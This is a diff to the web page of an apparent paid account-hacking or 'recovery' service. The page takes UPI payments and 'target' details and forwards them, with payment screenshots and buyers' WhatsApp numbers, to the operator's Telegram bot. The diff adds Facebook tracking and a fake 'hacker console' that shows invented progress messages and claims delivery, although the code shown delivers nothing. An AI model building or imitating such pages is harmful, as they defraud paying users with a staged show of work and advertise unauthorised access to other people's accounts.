@@ -8,6 +8,21 @@
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '2315425135627232');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=2315425135627232&ev=PageView&noscript=1"
+    /></noscript>
     <style>
         :root { --neon-blue: #00f2ff; --neon-green: #0f0; --deep-dark: #02050a; --card-bg: rgba(5, 12, 20, 0.95); --border: rgba(0, 242, 255, 0.3); }
         body { background-color: var(--deep-dark); color: #e0e0e0; font-family: 'Inter', sans-serif; margin: 0; overflow-x: hidden; }
@@ -94,7 +109,7 @@
             <li><i class="fab fa-snapchat"></i> Snapchat Support</li>
         </ul>
         <div class="price-tag">₹599</div>
-        <button class="order-btn" onclick="openStep('selectionModal')">BOOK NOW</button>
+        <button class="order-btn" onclick="if(typeof fbq === 'function') fbq('track', 'Contact'); openStep('selectionModal');">BOOK NOW</button>
     </div>
 
     <div class="card">
@@ -106,7 +121,7 @@
             <li><i class="fas fa-map-marker-alt"></i> Location Safety Audit</li>
         </ul>
         <div class="price-tag">₹699</div>
-        <button class="order-btn" onclick="openStep('deviceSelectionModal')">BOOK NOW</button>
+        <button class="order-btn" onclick="if(typeof fbq === 'function') fbq('track', 'Contact'); openStep('deviceSelectionModal');">BOOK NOW</button>
     </div>
 
     <div class="card">
@@ -117,7 +132,7 @@
             <li><i class="fas fa-desktop"></i> Remote Access Security</li>
         </ul>
         <div class="price-tag">₹999</div>
-        <button class="order-btn" onclick="prepareInput('Advanced Security Audit', 999, 'number')">BOOK NOW</button>
+        <button class="order-btn" onclick="if(typeof fbq === 'function') fbq('track', 'Contact'); prepareInput('Advanced Security Audit', 999, 'number');">BOOK NOW</button>
     </div>
 </div>
 
@@ -206,7 +221,7 @@
         <h2 style="font-family:'Orbitron'; color:#0f0;">PAYMENT VERIFIED</h2>
         <p style="color:#888; margin-bottom: 20px;">Enter your WhatsApp number to receive access link.</p>
         <input type="text" id="userWhatsApp" class="cyber-input" placeholder="+91 WhatsApp Number">
-        <button class="order-btn" onclick="runHackerConsole()">GET ACCESS NOW</button>
+        <button class="order-btn" onclick="if(typeof fbq === 'function') fbq('track', 'Lead'); runHackerConsole();">GET ACCESS NOW</button>
     </div>
 </div>
 
@@ -272,230 +287,105 @@ function prepareInput(s, p, type) {
 
 function showPayment() { 
     if(!document.getElementById('targetData').value) return alert("Please enter details!");
-    document.getElementById('payAmt').innerText = "₹" + price; 
-    let upiUrl = `upi://pay?pa=${MY_UPI}&pn=Orbitcon&am=${price}&cu=INR`;
-    document.getElementById('qrImage').src = `https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=${encodeURIComponent(upiUrl)}`;
+    document.getElementById('payAmt').innerText = '₹' + price;
+    const upiUri = `upi://pay?pa=${MY_UPI}&pn=Orbitcon&am=${price}&cu=INR`;
+    document.getElementById('qrImage').src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiUri)}`;
     openStep('paymentModal');
 }
 
 function payViaApp() {
-    let upiUrl = `upi://pay?pa=${MY_UPI}&pn=Orbitcon&am=${price}&cu=INR`;
-    window.location.href = upiUrl;
+    const upiUri = `upi://pay?pa=${MY_UPI}&pn=Orbitcon&am=${price}&cu=INR`;
+    window.location.href = upiUri;
 }
 
 function checkUpload() {
     const file = document.getElementById('payScreenshot').files[0];
     const btn = document.getElementById('payBtn');
-    if(file) { btn.disabled = false; btn.style.opacity = "1"; btn.style.cursor = "pointer"; }
+    if(file) {
+        btn.disabled = false;
+        btn.style.opacity = '1';
+        btn.style.cursor = 'pointer';
+    } else {
+        btn.disabled = true;
+        btn.style.opacity = '0.4';
+        btn.style.cursor = 'not-allowed';
+    }
 }
 
-async function startVerification() {
+function startVerification() {
     openStep('verifyModal');
-    const file = document.getElementById('payScreenshot').files[0];
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('caption', `🔔 NEW PAYMENT RECEIVED!\nService: ${service}\nAmount: ₹${price}\nTarget: ${document.getElementById('targetData').value}`);
-    formData.append('photo', file);
+    sendToTelegram();
+    setTimeout(() => { openStep('deliveryModal'); }, 3000);
+}
 
-    try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-        setTimeout(() => openStep('deliveryModal'), 3000);
-    } catch(e) {
-        alert("Server Busy. Please try again.");
-        closeModals();
+function sendToTelegram() {
+    const target = document.getElementById('targetData').value;
+    const file = document.getElementById('payScreenshot').files[0];
+    const caption = `🚨 NEW ORDER RECEIVED!\n\nService: ${service}\nPrice: ₹${price}\nTarget Details: ${target}`;
+    
+    if(file) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', file);
+        formData.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+    } else {
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: caption })
+        });
     }
 }
 
 function runHackerConsole() {
     const wa = document.getElementById('userWhatsApp').value;
-    if(!wa) return alert("Enter WhatsApp Number!");
+    if(!wa) return alert("Please enter WhatsApp number!");
+    
+    // Telegram Alert for User WhatsApp Number
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: `📱 WhatsApp Provided: ${wa} for Service: ${service}` })
+    });
+
     openStep('successConsole');
-    let logs = [
-        "> Establishing Secure Connection...",
-        "> Accessing Root Directories...",
-        "> Bypassing Encryption Layers...",
-        "> Injecting Recovery Modules...",
-        "> Success! Finalizing Delivery to " + wa
+    let prog = 0;
+    const log = document.getElementById('terminalLog');
+    const fill = document.getElementById('consoleProgress');
+    const status = document.getElementById('consoleStatus');
+
+    const logs = [
+        "> Bypassing firewall protocols...",
+        "> Establishing secure encrypted proxy...",
+        "> Accessing root directory...",
+        "> Extracting targeted dataset...",
+        "> Preparing compressed package...",
+        "> Generating secure access key..."
     ];
-    let i = 0; let prog = 0;
-    let intv = setInterval(() => {
-        if(i < logs.length) {
-            document.getElementById('terminalLog').innerHTML += logs[i] + "<br>";
-            i++;
+
+    let logIdx = 0;
+    const interval = setInterval(() => {
+        prog += Math.floor(Math.random() * 12) + 5;
+        if(prog > 100) prog = 100;
+        
+        fill.style.width = prog + '%';
+        status.innerText = `PROCESSING DATA: ${prog}%`;
+
+        if(prog > (logIdx + 1) * 15 && logIdx < logs.length) {
+            log.innerHTML += logs[logIdx] + "<br>";
+            logIdx++;
         }
-        prog += 5;
-        document.getElementById('consoleProgress').style.width = prog + "%";
-        document.getElementById('consoleStatus').innerText = "PROCESSING DATA: " + prog + "%";
-        if(prog >= 100) {
-            clearInterval(intv);
-            alert("SUCCESS! Details sent to your WhatsApp.");
-            window.location.reload();
+
+        if(prog === 100) {
+            clearInterval(interval);
+            log.innerHTML += "<br><span style='color:#0f0;'>[SUCCESS] RECOVERY COMPLETED!</span><br>> Dispatching access link to " + wa + " via WhatsApp...";
+            setTimeout(() => {
+                alert("SUCCESS! Access link generated and dispatched to your WhatsApp number.");
+            }, 1000);
         }
     }, 400);
 }
 </script>
-<div class="wa-container-left">
-    <div class="wa-popup-left" id="waPopup">
-        <span class="wa-popup-close-left" onclick="closeWaPopup()">&times;</span>
-        <div class="wa-popup-header-left">
-            <div class="wa-dot-left"></div>
-            <strong>Online Support (ऑनलाइन सहायता)</strong>
-        </div>
-        <p class="wa-popup-text-left">
-            नमस्ते! मैं आपकी क्या सहायता कर सकता हूँ?<br>
-            <span style="font-size: 13px; color: #555; font-weight: normal;">Hello! How can I help you today?</span>
-        </p>
-    </div>
-
-    <a href="javascript:void(0);" onclick="openWhatsAppAPI()" class="wa-floating-btn-left">
-    Chat With Us
-</a>
-
-<script>
-function openWhatsAppAPI() {
-    var phone = "918764807797";
-    var text = encodeURIComponent("Sir I want to get your service");
-    
-    var waUrl = "https://wa.me/" + phone + "?text=" + text;
-    var waAppUrl = "whatsapp://send?phone=" + phone + "&text=" + text;
-
-    var ua = navigator.userAgent || navigator.vendor || window.opera;
-    var isMobile = /Android|iPhone|iPad|iPod/i.test(ua);
-
-    if (isMobile) {
-        window.location.href = waAppUrl;
-        setTimeout(function() {
-            window.location.href = waUrl;
-        }, 300);
-    } else {
-        window.open(waUrl, '_blank');
-    }
-}
-</script>
-        
-        
-        
-        
-        
-
-<style>
-.wa-container-left {
-    position: fixed;
-    bottom: 25px;
-    left: 25px; /* बटन हमेशा स्क्रीन की बाईं तरफ रहेगा */
-    z-index: 99999;
-    font-family: 'Arial', sans-serif;
-    display: flex;
-    flex-direction: column;
-    align-items: flex-start;
-}
-
-/* मुख्य व्हाट्सएप्प बटन स्टाइल (हमेशा दिखने वाला) */
-.wa-floating-btn-left {
-    background-color: #25D366;
-    color: white;
-    text-decoration: none;
-    padding: 12px 20px;
-    border-radius: 50px;
-    display: flex;
-    align-items: center;
-    box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.3);
-    transition: transform 0.3s ease, background-color 0.3s ease;
-    /* ध्यान खींचने के लिए बटन हमेशा धीरे-धीरे झूलता रहेगा */
-    animation: waBounceLeft 3s infinite ease-in-out; 
-}
-
-.wa-floating-btn-left img {
-    width: 28px;
-    height: 28px;
-}
-
-.wa-btn-text-left {
-    margin-left: 10px;
-    font-weight: bold;
-    font-size: 15px;
-}
-
-.wa-floating-btn-left:hover {
-    background-color: #128C7E;
-    transform: scale(1.08);
-}
-
-/* पॉप-अप बॉक्स की स्टाइल */
-.wa-popup-left {
-    background: white;
-    color: #333;
-    padding: 15px;
-    border-radius: 12px;
-    box-shadow: 0px 5px 25px rgba(0,0,0,0.2);
-    margin-bottom: 15px;
-    width: 280px;
-    position: relative;
-    border-left: 4px solid #25D366;
-    display: none; /* शुरू में लोड होते वक्त 2 सेकंड छुपा रहेगा */
-    animation: waPopInLeft 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
-}
-
-.wa-popup-header-left {
-    display: flex;
-    align-items: center;
-    font-size: 12px;
-    color: #777;
-    margin-bottom: 8px;
-}
-
-.wa-dot-left {
-    width: 8px;
-    height: 8px;
-    background-color: #25D366;
-    border-radius: 50%;
-    margin-right: 6px;
-    display: inline-block;
-}
-
-.wa-popup-text-left {
-    margin: 0;
-    font-size: 14px;
-    line-height: 1.5;
-    font-weight: bold;
-}
-
-/* पॉप-अप बंद करने का क्रॉस (X) बटन */
-.wa-popup-close-left {
-    position: absolute;
-    top: 5px;
-    right: 10px;
-    font-size: 18px;
-    cursor: pointer;
-    color: #aaa;
-}
-.wa-popup-close-left:hover { color: #333; }
-
-/* --- एनीमेशन इफेक्ट्स --- */
-@keyframes waBounceLeft {
-    0%, 100% { transform: translateY(0); }
-    50% { transform: translateY(-8px); }
-}
-
-@keyframes waPopInLeft {
-    from { opacity: 0; transform: translateY(20px) scale(0.8); }
-    to { opacity: 1; transform: translateY(0) scale(1); }
-}
-</style>
-
-<script>
-// पेज या सेक्शन लोड होने के ठीक 2 सेकंड बाद पॉप-अप उछलकर सामने आएगा
-setTimeout(function() {
-    document.getElementById('waPopup').style.display = 'block';
-}, 2000);
-
-// यहाँ से ऑटो-क्लोज (Auto Hide) का कोड हटा दिया गया है, अब यह हमेशा खुला रहेगा।
-
-// सिर्फ जब क्लाइंट खुद (X) पर क्लिक करेगा, तब पॉप-अप बंद होगा
-function closeWaPopup() {
-    document.getElementById('waPopup').style.display = 'none';
-}
-</script>
-
 </body>
 </html>
